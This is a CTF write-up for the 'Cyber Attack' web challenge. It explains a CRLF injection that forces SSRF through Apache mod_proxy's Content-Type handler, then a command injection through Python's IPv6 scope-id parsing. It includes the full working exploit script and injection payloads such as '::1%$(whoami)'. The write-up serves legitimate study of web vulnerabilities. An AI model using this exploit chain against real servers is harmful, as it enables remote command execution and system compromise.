# Cyber Attack

> Welcome, Brave Hero of Eldoria. You’ve entered a domain controlled by the forces of Malakar, the Dark Ruler of Eldoria. This is no place for the faint of heart. Proceed with caution: The systems here are heavily guarded, and one misstep could alert Malakar’s sentinels. But if you’re brave—or foolish—enough to exploit these defenses, you might just find a way to weaken his hold on this world. Choose your path carefully: Your actions here could bring hope to Eldoria… or doom us all. The shadows are watching. Make your move.

**Difficulty:** Easy  
**Source Code:** Provided  
**Techniques used:** CRLF Injection to force SSRF via Content-Type, and Command Injection

Alright, this challenge almost made me give **up on** the CTF. After finishing the [Trial By Fire](../trail_by_fire/writeup-en.md), I went straight to this one... and nothing. Gave up on the challenge and jumped into the [Eldoria Panel](../eldoria_panel/writeup-en.md), which I also failed. That was it for the day. I only got back to this challenge on Sunday morning.

It's basically a simple PHP app with one main functionality: attacking a specific target. You can attack via domain or IP. The attack logic is implemented in Python CGI, one script for domains, one for IPs.

Domain attack can be found in `src/cgi-bin/attack-domain`
```python
form = cgi.FieldStorage()
name = form.getvalue('name')
target = form.getvalue('target')

if not name or not target:
    print('Location: ../?error=Hey, you need to provide a name and a target!')
try:
    count = 1 # Increase this for an actual attack
    os.popen(f'ping -c {count} {ip_address(target)}') 
    print(f'Location: ../?result=Succesfully attacked {target}!')
except:
    print(f'Location: ../?error=Hey {name}, watch it!')
    
print('Content-Type: text/html')
print()
```

IP attack can be found in `src/cgi-bin/attack-ip`
```python
form = cgi.FieldStorage()
name = form.getvalue('name')
target = form.getvalue('target')

if not name or not target:
    print('Location: ../?error=Hey, you need to provide a name and a target!')
try:
    count = 1 # Increase this for an actual attack
    os.popen(f'ping -c {count} {ip_address(target)}') 
    print(f'Location: ../?result=Succesfully attacked {target}!')
except:
    print(f'Location: ../?error=Hey {name}, watch it!')
    
print('Content-Type: text/html')
print()
```

The IP-based attack is blocked by the Apache reverse proxy, as we can see in `apache/apache2.conf`
```conf
ServerName CyberAttack 

AddType application/x-httpd-php .php

<Location "/cgi-bin/attack-ip"> 
    Order deny,allow
    Deny from all
    Allow from 127.0.0.1
    Allow from ::1
</Location>
```

That means one thing: you can try bypassing the regex, but you'll fail. So, we either need to bypass the Apache configuration or find another way in.

I found a `CRLF injection` in the `Location:` header in both scripts, but I couldn’t do anything useful with it at first.

I had already lost a few hours on Friday trying to bypass the regex and abuse the `CRLF injection` in the response and got nowhere.

So I changed my approach. Instead of the classic "try and fail", I started doing some research and chatting with my buddy Gpeto(a.k.a. ChatGPT). I even tried digging directly into the config files. When that didn’t work either, I almost gave up again, but then I decided to check the `Dockerfile`. Same approach: search for anything interesting, any keywords.

That’s when I stumbled on this line:  `RUN a2enmod rewrite cgi proxy proxy_fcgi proxy_http` 
And that’s when things started to get weird. Really weird.

Because someone — somewhere in the world — thought it would be a great idea for the `mod_proxy` module to allow proxying based on the **Content-Type** header. I’m not kidding.

I found this insanity in Carlos Polop’s amazing blog [HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/apache.html?highlight=mod_proxy#arbitrary-handler-to-full-ssrf).

After that, things started to fall into place. All I needed was a way to bypass the `ip_address` function. I started looking into the IPv4 validation — nothing interesting. Then I moved on to IPv6, and right away, something caught my eye.

The validation checks if there’s a `/` in the address. If not, it calls `self._split_scope_id`:
```python
addr_str = str(address)
if '/' in addr_str:
	raise AddressValueError("Unexpected '/' in %r" % address)
addr_str, self._scope_id = self._split_scope_id(addr_str)
```

And the method will split the address by scope using `%`, so we just need to pass `::1%$(whoami)`
```python
@staticmethod
def _split_scope_id(ip_str):
	"""Helper function to parse IPv6 string address with scope id.

	See RFC 4007 for details.

	Args:
		ip_str: A string, the IPv6 address.

	Returns:
		(addr, scope_id) tuple.

	"""
	addr, sep, scope_id = ip_str.partition('%')
	if not sep:
		scope_id = None
	elif not scope_id or '%' in scope_id:
		raise AddressValueError('Invalid IPv6 address: "%r"' % ip_str)
	return addr, scope_id
```

We need to worry about the `/`, so my first idea was to use base64 — but I ran into some issues because the payload was being converted to lowercase.  
So I went with hex instead and passed the command I needed that way.

Just send something like `::1$($(python -c "print('{cmd}')"|sh)`. Just be careful with the encoding.  
In the script, I used a raw `socket` connection to send the HTTP request because I needed full control over the encoding.

Here's the full script:
```python
import argparse
import socket
import urllib.parse
import requests
import urllib

parser = argparse.ArgumentParser()
parser.add_argument("--host", type=str, default="localhost", help="Target Host")
parser.add_argument("--port", type=str, default="1337", help="Target Port")
parser.add_argument("--cmd", type=str, default="cp /flag*txt /var/www/html/flag.txt", help="Command to execute on the server")

args = parser.parse_args()

hex_str = args.cmd.encode().hex()
cmd = urllib.parse.quote(''.join(f'\\x{hex_str[i:i+2]}' for i in range(0, len(hex_str), 2)))

payload = f"""
Location:+/nope
Content-Type:+proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=::1%$(python3%2b-c%2b"print('{cmd}')"|sh)%26name=BB

""".replace('\n','%0d%0a')
s = socket.create_connection((args.host, int(args.port)))
req = f"""GET /cgi-bin/attack-domain?target=-&name={payload} HTTP/1.1
Host: {args.host}

""".replace('\n','\r\n')
s.sendall(req.encode())
_ = s.recv(4096).decode()
s.close()

response = requests.get(f"http://{args.host}:{args.port}/flag.txt")
print(response.text)
```

After running the script, the flag was successfully retrieved:
![Flag](imgs/flag.png)

>**Note:** I missed the timing to write the write-ups and the after party is over, so the challenge is now running locally on my machine.  
>But I swear it works, really works.